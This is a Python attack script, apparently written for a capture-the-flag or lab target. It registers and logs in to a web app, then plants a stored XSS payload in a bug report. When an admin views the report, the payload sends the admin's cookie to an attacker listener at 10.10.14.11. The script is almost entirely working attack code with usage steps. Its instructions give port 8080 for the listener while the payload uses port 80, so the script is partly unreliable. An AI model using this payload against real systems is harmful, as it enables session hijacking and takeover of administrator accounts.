#!/usr/bin/env python3

"""
- Start a http server with command:

python3 -m http.server 8080

- Run the script

- Wait for the admin to view the bug report

- Check your listener on 10.10.14.11:8080

- The admin should trigger the XSS when viewing the bug report, and you should get the cookie displayed 
  in your server log.
"""

import requests
import json

# Target URL - adjust based on your setup
BASE_URL = "http://your-target-domain.com"

# Account credentials
USERNAME = "username"
PASSWORD = "pass1234"

# XSS payload
BUG_NAME = '<img src=1 onerror="document.location=\'http://10.10.14.11:80/give_me_the_cookie\'+ document.cookie">'
BUG_DETAILS = '<img src=1 onerror="document.location=\'http://10.10.14.11:80/give_me_the_cookie\'+ document.cookie">'


# Helper functions
def register_account(session):
    """Register a new account"""
    url = f"{BASE_URL}/register"
    data = {
        "username": USERNAME,
        "password": PASSWORD
    }
    
    print(f"[*] Registering account: {USERNAME}")
    response = session.post(url, json=data)
    result = response.json()
    
    if result.get("success"):
        print(f"[+] Registration successful: {result.get('message')}")
        return True
    else:
        print(f"[-] Registration failed: {result.get('message')}")
        return False

def login_account(session):
    """Login to the account"""
    url = f"{BASE_URL}/login"
    data = {
        "username": USERNAME,
        "password": PASSWORD
    }
    
    print(f"[*] Logging in as: {USERNAME}")
    response = session.post(url, json=data)
    result = response.json()
    
    if result.get("success"):
        print(f"[+] Login successful: {result.get('message')}")
        return True
    else:
        print(f"[-] Login failed: {result.get('message')}")
        return False

def submit_bug_report(session):
    """Submit bug report with XSS payload"""
    url = f"{BASE_URL}/report_bug"
    data = {
        "bugName": BUG_NAME,
        "bugDetails": BUG_DETAILS
    }
    
    print("[*] Submitting bug report with XSS payload")
    response = session.post(url, json=data)
    result = response.json()
    
    if result.get("success"):
        print(f"[+] Bug report submitted: {result.get('message')}")
        return True
    else:
        print(f"[-] Bug report failed: {result.get('message')}")
        return False

def main():
    # Create a session to maintain cookies
    session = requests.Session()
    
    print("=" * 60)
    print("XSS Testing Script for Cookie Stealer")
    print("=" * 60)
    
    # Step 1: Register
    if not register_account(session):
        print("[!] Trying to login instead (account may already exist)")
    
    # Step 2: Login
    if not login_account(session):
        print("[!] Cannot proceed without valid login")
        return
    
    # Step 3: Submit bug report with XSS
    submit_bug_report(session)
    
    print("\n[*] Script completed. Check your listener on 10.10.14.11:8080")
    print("[*] Admin should trigger the XSS when viewing the bug report")
    print("[*] You should get the cookie displayed in your server log")
    print("[*] Enjoy!")
    print("=" * 60)
    
if __name__ == "__main__":
    main()